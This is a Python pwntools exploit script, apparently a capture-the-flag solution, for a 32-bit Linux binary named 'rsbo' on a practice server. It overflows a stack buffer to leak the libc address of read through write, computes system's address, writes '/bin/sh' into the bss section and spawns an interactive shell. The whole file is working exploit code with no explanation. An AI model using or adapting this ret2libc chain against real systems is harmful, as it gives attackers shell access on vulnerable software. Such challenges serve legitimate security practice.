#encoding:utf-8
from pwn import *
context(os="linux", arch="i386",log_level = "debug")

ip =""#hackme.inndy.tw 
if ip:
	p = remote(ip,7706)
else:
	p = process("./rsbo")

elf = ELF("./rsbo")
libc = ELF("../libc-2.23.so.i386")
#libc = elf.libc
#-------------------------------------
def sl(s):
	p.sendline(s)
def sd(s):
	p.send(s)
def rc(timeout=0):
	if timeout == 0:
		return p.recv()
	else:
		return p.recv(timeout=timeout)
def ru(s, timeout=0):
	if timeout == 0:
		return p.recvuntil(s)
	else:
		return p.recvuntil(s, timeout=timeout)
def debug(msg=''):
    gdb.attach(p,'')
    pause()
def getshell():
	p.interactive()
#-------------------------------------
write_plt = elf.plt["write"]
write_got = elf.got["write"]
read_plt = elf.plt["read"]
read_got = elf.got["read"]
bss =elf.bss()
write_libc = libc.symbols["write"]
start = 0x08048490
binsh_libc= libc.search("/bin/sh").next()
log.info("bss--->"+hex(bss))

payload ="\x00"*108+p32(write_plt)+p32(start)+p32(1)+p32(read_got)+p32(4)

sd(payload)
read = u32(p.recv(4))
log.info("read--->"+hex(read))

libc_base = read - libc.symbols["read"]
system_addr = libc_base +libc.symbols["system"]
sleep(0.5)

payload2 = "\x00" * 108 + p32(read) + p32(start) + p32(0) + p32(bss) + p32(9)
payload3 = "\x00" * 108 + p32(system_addr) + p32(start) + p32(bss)

sd(payload2)
sl("/bin/sh\0")
sd(payload3)
getshell()
